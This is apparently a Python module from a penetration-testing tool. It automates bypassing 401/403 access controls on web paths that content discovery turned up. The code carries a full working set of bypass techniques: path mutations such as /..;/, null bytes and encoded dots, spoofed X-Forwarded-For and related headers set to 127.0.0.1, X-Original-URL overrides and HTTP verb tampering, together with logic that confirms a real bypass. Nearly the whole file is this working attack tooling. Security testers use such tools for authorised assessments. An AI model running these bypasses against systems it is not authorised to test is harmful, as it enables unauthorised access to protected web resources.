from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403

# ════════════════════════════════════════════════════════════════════════
#  401 / 403 ACCESS-CONTROL BYPASS  ::  drives off the content (gobuster/
#  feroxbuster) results — every path that came back 401/403 is re-tested with
#  the standard bypass primitives and CONFIRMED only by proof.
#
#  Techniques
#    path-mutation   trailing dot/slash, //, /./ , /..;/ , ;/ , %2e, %20, %09,
#                    %00, case-toggle, extension-append, path-*  …
#    header-spoof    X-Forwarded-For / X-Real-IP / X-Custom-IP-Authorization /
#                    X-Originating-IP / … = 127.0.0.1|localhost, X-Forwarded-Host
#    url-override    GET /  +  X-Original-URL: /admin   (and X-Rewrite-URL)
#    verb-tamper     POST / PUT / PATCH / OPTIONS / arbitrary "FOO"
#
#  False-positive control (this is the important part):
#    1. Re-request the path FRESH first. If the current identity no longer gets
#       401/403 (e.g. our session already grants it), there is nothing to bypass
#       — skip it. We trust the live response, not gobuster's cached status.
#    2. CALIBRATE per host: fetch a random non-existent path. If the site is a
#       catch-all / SPA that answers 200 to everything, a bypass "200" is
#       meaningless unless its body ALSO differs from that catch-all page.
#    3. CONFIRM only when: status is 2xx, the body differs from BOTH the denial
#       baseline AND the catch-all page, and it carries no forbidden/denied/
#       login markers. A 2xx that still looks like the denial page is demoted to
#       [review] (soft/again-forbidden), never silently reported as a win.
# ════════════════════════════════════════════════════════════════════════


_DENIAL_MARKERS = ("forbidden", "access denied", "not authorized",
                   "unauthorized", "403 error", "401 error",
                   "authentication required", "permission denied")

_LOGIN_MARKERS = ("name=\"password\"", "type=\"password\"", "please log in",
                  "sign in to continue")

_IP_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
               "X-Remote-Addr", "X-Client-IP", "Client-IP", "True-Client-IP",
               "Cluster-Client-IP", "X-Custom-IP-Authorization")

_HOST_HEADERS = ("X-Forwarded-Host", "X-Host", "X-Forwarded-Server")

_VERBS = ("POST", "PUT", "PATCH", "OPTIONS", "FOO")


def _root_and_path(entry_url, path):
    """Return (scheme://netloc, /clean/path) handling both gobuster ('/admin')
    and feroxbuster ('http://h/admin') path shapes."""
    if str(path).startswith("http"):
        sp = urlsplit(path)
        return f"{sp.scheme}://{sp.netloc}", (sp.path or "/")
    sp = urlsplit(entry_url)
    p = path if str(path).startswith("/") else "/" + str(path)
    return f"{sp.scheme}://{sp.netloc}", p


def _path_variants(p):
    """Return [(label, mutated_path)]; bounded, ordered by likelihood."""
    s = p.rstrip("/") or "/"
    seg = s.rsplit("/", 1)[-1]
    head = s[: len(s) - len(seg)]
    toggled = head + (seg[:1].swapcase() + seg[1:] if seg else seg)
    out = [
        ("trailing-slash",     p + "/" if not p.endswith("/") else p.rstrip("/")),
        ("trailing-dot",       s + "/."),
        ("dot-slash-prefix",   "/." + s),
        ("double-slash",       "/" + s.lstrip("/") + "//"),
        ("semicolon-slash",    s + "/..;/"),
        ("semicolon",          s + ";/"),
        ("encoded-dot",        s + "%2e/"),
        ("trailing-space",     s + "%20"),
        ("trailing-tab",       s + "%09"),
        ("null-byte",          s + "%00"),
        ("wildcard",           s + "/*"),
        ("case-toggle",        toggled),
        ("ext-json",           s + ".json"),
        ("ext-semicolon-css",  s + ";.css"),
        ("mid-encoded-slash",  s + "..%2f"),
    ]
    seen, uniq = set(), []
    for label, v in out:
        if v and v != p and v not in seen:
            seen.add(v)
            uniq.append((label, v))
    return uniq


def _fetch(url, config, runner, tag, extra=None):
    st, hd, body, _ = _curl_full(url, config, runner, tag, extra=extra)
    try:
        code = int(st)
    except (TypeError, ValueError):
        code = 0
    return code, (body or "")


def _similar(a, b):
    la, lb = len(a), len(b)
    if max(la, lb) == 0:
        return True
    if abs(la - lb) <= max(24, 0.02 * max(la, lb)):
        return a[:300] == b[:300]
    return False


def _looks_denied(body):
    low = body.lower()
    return any(m in low for m in _DENIAL_MARKERS) or any(m in low for m in _LOGIN_MARKERS)


def _classify(code, body, denial_body, cal_catchall, cal_body):
    """None = not a bypass; 'confirmed' or 'review'."""
    if code not in (200, 201, 202, 206):
        return None
    if cal_catchall and _similar(body, cal_body):
        return None                      # catch-all/SPA answers 200 to anything
    if _similar(body, denial_body):
        return None                      # same denial page with a 200 wrapper
    if _looks_denied(body):
        return "review"                  # got 200 but content still says denied
    if len(body) <= len(denial_body):
        return "review"                  # smaller/equal — weak, needs eyes
    return "confirmed"


def _calibrate(root, config, runner):
    rnd = "/hnyx" + _rand(10)
    code, body = _fetch(root + rnd, config, runner, "bypass_calib")
    return (code in (200, 201, 202, 206)), body


def phase_bypass(target, config, runner):
    target.ensure_web_services(config, runner)
    result = {"findings": [], "tested": 0, "errors": []}
    content = target.results.get("content") or {}
    services = content.get("services", [])
    if not services:
        result["errors"].append("no content results (run --content / gobuster first)")
        UI.warn("bypass: no gobuster/feroxbuster results to work from")
        return result

    # collect protected (401/403) paths from the content phase
    protected = []
    seen = set()
    for e in services:
        for f in e.get("found", []):
            if (f.get("status") or 0) in (401, 403):
                root, p = _root_and_path(e.get("url", ""), f.get("path", ""))
                sig = (root, p)
                if sig not in seen:
                    seen.add(sig)
                    protected.append((root, p, f.get("status")))
    if not protected:
        UI.dim("      no 401/403 paths in content results — nothing to bypass")
        return result

    cap = int(config.get("active.max_endpoints", 60) or 60)
    delay = float(config.get("active.delay", 0) or 0)
    UI.info(f"401/403 bypass on {min(len(protected), cap)} protected path(s)")

    calib_cache = {}
    for root, path, gobuster_code in protected[:cap]:
        full = root + path
        btag = re.sub(r"\W+", "_", path)[:34] or "root"

        # (1) trust the LIVE response, not gobuster's cached status
        base_code, base_body = _fetch(full, config, runner, f"bypass_base_{btag}")
        if base_code not in (401, 403):
            if base_code in (200, 201, 202, 206):
                UI.dim(f"      {path}: now {base_code} for current identity — skipping")
            continue
        result["tested"] += 1

        # (2) per-host catch-all calibration
        if root not in calib_cache:
            calib_cache[root] = _calibrate(root, config, runner)
        cal_catchall, cal_body = calib_cache[root]

        hit = None

        def record(technique, detail, code, body):
            nonlocal hit
            verdict = _classify(code, body, base_body, cal_catchall, cal_body)
            if not verdict:
                return False
            f = {"url": full, "path": path, "technique": technique,
                 "detail": detail, "from": base_code, "to": code,
                 "review": verdict == "review"}
            result["findings"].append(f)
            if hit is None or (verdict == "confirmed" and hit.get("review")):
                hit = f
            tag = "[review]" if verdict == "review" else "[CONFIRMED]"
            fn = UI.warn if verdict == "review" else UI.ok
            fn(f"403-BYPASS {tag} {technique}: {path}  ({base_code}->{code})")
            UI.dim(f"      {detail}")
            return verdict == "confirmed"

        # --- path mutations ---
        for label, mp in _path_variants(path):
            code, body = _fetch(root + mp, config, runner,
                                f"bypass_pm_{label}_{btag}")
            if record(f"path/{label}", f"GET {root + mp}", code, body):
                break
            if delay:
                time.sleep(delay)

        # --- url-override headers (request root, point header at the path) ---
        if hit is None or hit.get("review"):
            for hdr in ("X-Original-URL", "X-Rewrite-URL"):
                code, body = _fetch(root + "/", config, runner,
                                    f"bypass_ov_{hdr}_{btag}",
                                    extra=["-H", f"{hdr}: {path}"])
                if record(f"header/{hdr}", f"GET {root}/  +  {hdr}: {path}",
                          code, body):
                    break

        # --- IP / host spoofing headers on the protected path ---
        if hit is None or hit.get("review"):
            for hdr in _IP_HEADERS:
                code, body = _fetch(full, config, runner,
                                    f"bypass_ip_{hdr}_{btag}",
                                    extra=["-H", f"{hdr}: 127.0.0.1"])
                if record(f"header/{hdr}", f"{hdr}: 127.0.0.1", code, body):
                    break
                if delay:
                    time.sleep(delay)
        if hit is None or hit.get("review"):
            for hdr in _HOST_HEADERS:
                code, body = _fetch(full, config, runner,
                                    f"bypass_host_{hdr}_{btag}",
                                    extra=["-H", f"{hdr}: localhost"])
                if record(f"header/{hdr}", f"{hdr}: localhost", code, body):
                    break

        # --- verb tampering ---
        if hit is None or hit.get("review"):
            for verb in _VERBS:
                code, body = _fetch(full, config, runner,
                                    f"bypass_verb_{verb}_{btag}",
                                    extra=["-X", verb])
                if record(f"method/{verb}", f"{verb} {full}", code, body):
                    break

        if hit is None:
            UI.dim(f"      {path}: no bypass ({base_code} held across all techniques)")

    confirmed = [f for f in result["findings"] if not f.get("review")]
    review = [f for f in result["findings"] if f.get("review")]
    if confirmed:
        UI.ok(f"found {len(confirmed)} confirmed access-control bypass(es)")
    if review:
        UI.warn(f"{len(review)} soft/again-denied response(s) — needs manual review")
    if not result["findings"]:
        UI.dim(f"      no bypasses ({result['tested']} protected path(s) tested)")
    return result


def _r_bypass(d):
    lines = _sec("401/403 ACCESS-CONTROL BYPASS")
    fs = d.get("findings", [])
    if not fs:
        note = d.get("errors", [])
        if note:
            lines.append("  " + note[0])
        else:
            lines.append(f"  none found ({d.get('tested', 0)} protected path(s) tested)")
        return lines + [""]
    # confirmed first
    for f in sorted(fs, key=lambda x: (x.get("review", False), x["path"])):
        tag = "[review]" if f.get("review") else "[CONFIRMED]"
        lines.append(f"  {tag} {f['path']}  ({f.get('from')}->{f.get('to')})  via {f['technique']}")
        lines.append(f"      {f.get('detail','')}")
    return lines + [""]
